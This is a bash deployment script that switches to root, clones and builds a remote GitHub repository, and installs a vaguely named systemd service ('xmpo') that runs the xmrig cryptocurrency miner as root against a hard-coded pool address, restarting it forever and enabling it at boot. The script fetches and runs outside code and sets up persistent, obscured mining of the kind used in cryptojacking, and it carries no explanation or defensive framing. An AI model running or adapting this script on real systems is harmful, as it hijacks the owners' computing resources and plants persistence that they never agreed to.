#!/bin/bash
sudo su
cd /usr/local/src/ &&
git clone https://github.com/huynhnham180793/xm &&
cd xm &&
git pull &&
sh build.sh

sudo bash -c 'cat <<EOT >>/lib/systemd/system/xmpo.service
[Unit]
Description=xmpo
After=network.target
[Service]
ExecStart=/usr/local/src/xm/xmrig.exe  -o 104.248.190.105:443 --tls
WatchdogSec=290
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
'&&

#!/bin/bash
systemctl daemon-reload &&
systemctl enable xmpo.service &&
service xmpo start
